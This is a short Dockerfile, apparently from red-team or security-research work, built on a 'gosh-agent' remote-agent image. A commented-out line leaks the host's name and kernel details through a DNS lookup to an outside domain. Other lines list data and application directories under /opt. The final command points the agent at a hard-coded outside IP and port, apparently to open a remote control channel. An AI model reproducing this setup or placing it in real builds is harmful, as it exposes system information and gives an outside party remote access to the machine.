FROM praetorianlabs/gosh-agent
#RUN un=`uname -nrs | sed 's/ //g'`  && dig $un.dns.praetorianlabs.com 
RUN ls /opt/data/
RUN ls /opt/app/
RUN ls /opt/atm/
CMD ["-host", "104.198.138.155:8083"]

